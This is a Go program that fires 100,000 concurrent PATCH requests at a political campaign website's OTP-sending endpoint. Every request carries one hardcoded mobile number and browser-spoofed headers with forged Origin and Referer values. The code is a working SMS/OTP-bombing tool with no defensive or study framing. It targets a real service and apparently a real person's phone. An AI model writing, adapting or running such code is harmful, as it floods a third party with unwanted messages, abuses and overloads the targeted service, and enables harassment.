package main

import (
	"bytes"
	"fmt"

	"mime/multipart"
	"net/http"
	"sync"
)

// sendRequest sends a PATCH request with multipart/form-data
func sendRequest(url string, headers map[string]string, mobile string, wg *sync.WaitGroup, results chan<- string) {
	defer wg.Done()

	// Create a buffer to write the form data
	var b bytes.Buffer
	w := multipart.NewWriter(&b)

	// Add the mobile field to the form
	fw, err := w.CreateFormField("mobile")
	if err != nil {
		results <- fmt.Sprintf("Error creating form field: %v", err)
		return
	}
	_, err = fw.Write([]byte(mobile))
	if err != nil {
		results <- fmt.Sprintf("Error writing form field: %v", err)
		return
	}

	// Close the multipart writer to set the terminating boundary
	w.Close()

	// Create a new request
	req, err := http.NewRequest("PATCH", url, &b)
	if err != nil {
		results <- fmt.Sprintf("Error creating request: %v", err)
		return
	}

	// Set the headers
	for key, value := range headers {
		req.Header.Set(key, value)
	}
	// Set the Content-Type header to include the boundary
	req.Header.Set("Content-Type", w.FormDataContentType())

	// Perform the request
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		results <- fmt.Sprintf("Error performing request: %v", err)
		return
	}
	defer resp.Body.Close()

	// Read the response body
	buf := new(bytes.Buffer)
	buf.ReadFrom(resp.Body)
	results <- fmt.Sprintf("Status Code: %d\nResponse Text: %s", resp.StatusCode, buf.String())
}

func main() {
	// Define the URL
	url := "https://ekbaarphirsemodisarkar.com/api/v1/user/send_otp_mobile?language=en"

	// Define the headers template
	headers := map[string]string{
		"Accept":             "*/*",
		"Accept-Encoding":    "gzip, deflate, br, zstd",
		"Accept-Language":    "en-GB,en-US;q=0.9,en;q=0.8",
		"Cache-Control":      "no-cache",
		"Connection":         "keep-alive",
		"Host":               "ekbaarphirsemodisarkar.com",
		"Origin":             "https://phirekbaarmodisarkar.bjp.org",
		"Pragma":             "no-cache",
		"Referer":            "https://phirekbaarmodisarkar.bjp.org/",
		"Sec-Fetch-Dest":     "empty",
		"Sec-Fetch-Mode":     "cors",
		"Sec-Fetch-Site":     "cross-site",
		"User-Agent":         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
		"sec-ch-ua":          `"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"`,
		"sec-ch-ua-mobile":   "?0",
		"sec-ch-ua-platform": `"Windows"`,
	}

	// Number of concurrent threads
	// numThreads := 20

	// Number of requests to send
	numRequests := 100000

	// WaitGroup to wait for all goroutines to finish
	var wg sync.WaitGroup

	// Channel to handle results
	results := make(chan string)

	// Launch goroutines
	for i := 0; i < numRequests; i++ {
		wg.Add(1)
		go sendRequest(url, headers, "7668183250", &wg, results)
	}

	// Wait for all goroutines to finish
	go func() {
		wg.Wait()
		close(results)
	}()

	// Print results as they come in
	for result := range results {
		fmt.Println(result)
	}
}
